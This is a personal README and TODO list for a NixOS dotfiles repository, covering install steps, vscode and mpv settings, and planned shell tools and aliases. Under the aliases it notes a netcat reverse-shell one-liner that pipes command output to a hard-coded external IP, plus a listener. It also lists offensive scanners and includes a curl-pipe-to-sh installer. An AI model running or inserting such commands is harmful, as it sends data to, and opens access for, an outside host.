# [Worst Nix/OS config ever](../README.md)

Goal is to provide modular close to windows-godlike desktop experience

## Installation

```bash
cd
git clone https://github.com/barsikus007/config
# cp config/nix/ ~/ && cd nix/
cd ~/config/nix/
sudo nixos-rebuild switch --flake .
home-manager switch --flake .
```

Set user password and TODO other steps from [NixOS installation manual](https://nixos.org/manual/nixos/stable/#ch-installation)

## Nix itself

### [WSL distro](https://nix-community.github.io/NixOS-WSL/)

### [Nix install](https://zero-to-nix.com/start/install/) speedrun on existing system

- `curl --proto '=https' --tlsv1.2 -sSf -L https://install.determinate.systems/nix | sh -s -- install`
  - enable systemd if wsl

## Config reference

## [vscode](.config/Code/User/)

- REMOVED from `settings.json`
  - remote.SSH.remotePlatform
  - sourcery.token
- TODO
  - export configs
    - layout
    - extensions
    - profiles
  - color logs
  - python -File activate envs
  - pycharm like run file
  - "python.analysis.autoImportCompletions": true
  - git tree view by default
  - ctrl+shift++ in terminal
  -
  - [test open](vscode://file/D:\sync\notes)
  - restart extension hosts workaround for copilot
  - debug inside python container
  - disable parenthesis when apply auto-import
  - PR settings.openFilesInProfile
  - remove/sort plugins
    - use profiles
      - make own profiles system with minimal overhead
        - nixos?
  - windows tab in terminal WTF
  -
    - compound logs check
    - cssho.vscode-svgviewer is needed?
    - jock.svg is needed?
  - shift+enter WTF
  - <https://code.visualstudio.com/docs/copilot/copilot-customization#_reusable-prompt-files-experimental>
  - <https://code.visualstudio.com/docs/copilot/copilot-customization>
  - <https://code.visualstudio.com/updates/v1_98#_task-rerun-action>

### [mpv](.config/mpv/)

- uosc skin
  - with thumbfast
- mpv.conf
  - no-border
  - snap-window
  - save-position-on-quit
  - screenshot-directory is desktop
  - ontop only when playing
  - profiles
    - playlist
      - move window to right down corner
      - resize to 25% of screen width
    - online (http)
      - same as playlist
    - music (mp3)
      - always show window
      - don't save position
  - TODO
    - headers based on link profile
    - additional track settings
      - sub/aud folder search
      - #Audio language priority
      - alang=ru,rus,en,eng,ja,jp,jpn
      - #Subtitle language priority
      - slang=ru,rus,en,eng,ja,jp,jpn
- input.conf
  - patched ru keybinds
  - middle mouse button to pin window on top
  - _/- to cycle video tracks
  - =/+ to cycle window sizes
  - Alt+[0-6] keys to change window size
  - k shuffle playlist
  - Alt+k unshuffle playlist
  - K loop/unloop playlist
  - n show file tags
  - [crop/encode](https://github.com/occivink/mpv-scripts/blob/master/input.conf)
    - crop
      - c for crop
      - Alt+c for soft crop
      - C for toggle crop (remove filter and crop)
      - l blur logo
      - d remove crop filter
      - D remove soft crop
    - encode
      - e for webm no audio
      - E for source
      - Alt+e for mp4 no audio
- [crop/encode scripts](https://github.com/occivink/mpv-scripts)
  - [crop fix](https://github.com/occivink/mpv-scripts/pull/77/files)

## TODO

- [flake-parts](https://nix-community.github.io/home-manager/index.xhtml#sec-flakes-flake-parts-module)
- parse nix files for pkgs (or do it via nix script)
- better way to work with functions in shell.nix
- GUI
  - move badapple gif and mp3 outsude of git (or genereate them idk)
  - obs
    - quick replay (import scenes)
      - battery/ac based quality

### Shell

#### New software

- zsh or fish (or bash lol)
- nmap to rustscan
- [dive](https://github.com/wagoodman/dive)
- [Mosh: the mobile shell](https://mosh.org/)
- <https://github.com/pojntfx/octarchive>
- [yassinebridi/serpl: A simple terminal UI for search and replace, ala VS Code.](https://github.com/yassinebridi/serpl)
- test.nix
  - busybox
  - lshw-gui
  - new add security scanners
    - nikto
    - ffuf
    - seclists
    - frida-tools
    - wifite2
    - zmap
    - rustscan
  - editor
    - helix

#### Alias

- 'sudo '
- pipi
- pyvcr
- pyv
- py
- wgu fzf selector
  - best location for config files
    - agenix secrets?
- grep config folder for cheatsheet
- code=co
- clear=cl
- dcu not pull
- dcup prod
- set-alias -name pn -value pnpm
- wsl `find / -not -path '/mnt/*'`
- `find / -not -path '/mnt/*' -name python -not -path '/home/*'`
- git config core.editor=code -w -n
- nc reverse shell
  - exec command 2>&1 | nc 176.117.72.208 12345
  - nc -l -p 12345 2>&1 | tee -a keklol
- fzc alias=fzf ~/config
- nv show .files
- nvf current dir or sudo or ignore /proc etc
- llt ls tree
  - or lll
- uv run --python 3.13t -- python
- py
- docker compose fzf command
- alias ip='ip --color=auto'
- proto outdated --update

#### Other

- [guix environment like](https://github.com/NixOS/nix/issues/8207)
  - [containter](https://wiki.nixos.org/wiki/NixOS_Containers)
  - [firejail](https://github.com/netblue30/firejail)
- bat
  - [zsh '--help' alias](https://github.com/sharkdp/bat#highlighting---help-messages)
    - [explain command](https://github.com/learnbyexample/command_help)
  - [bat extras](https://github.com/eth-p/bat-extras)
    - programs.bat.extraPackages
      - batdiff?
      - batman ?
- nvim
  - nvimpager
    - enable syntax hightlighting
    - disable all other
    - batman ?
  - init.lua vim types
- python
  - direnv
  - uv2nix
- starship
  - remove versions
- .editorconfig conf
  - make it global ?

### 25.05

- `unstable.` search
- `nh os repl`
- services.syncthing.tray.command
- vscode.profiles
- stylix
  - nvf
  - cursor fix
- mesa 25
  - plasma-desktop 6.3
    - cursors?
